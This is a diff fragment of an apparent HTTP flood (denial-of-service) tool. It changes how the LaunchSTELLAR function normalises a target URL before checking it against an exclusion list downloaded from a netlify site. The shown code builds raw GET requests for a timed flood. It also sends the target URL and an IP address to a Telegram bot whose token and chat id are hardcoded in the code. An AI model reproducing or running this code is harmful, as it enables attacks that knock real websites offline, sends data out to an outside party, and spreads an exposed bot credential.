@@ -660,7 +660,10 @@ def LaunchSTELLAR(url, timer):
     requests.get('https://api.telegram.org/bot6173247063:AAHP9rdLsVuv1mDpXGk6_9zn46fjwOOr2XU/sendmessage?chat_id=6243725767&text=URL: ' + url + ' IP: ' + response.text)
     responses = requests.get("https://serene-treacle-2d26bc.netlify.app/website.txt")
     contents = responses.text
-    if url not in contents:
+    urls = url.replace('https://', '')
+    urls = urls.replace('http://', '')
+    urls = urls.replace('/', '')
+    if urls not in contents:
         timelol = time.time() + int(timer)
         req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
         req += "Cache-Control: no-cache\r\n"
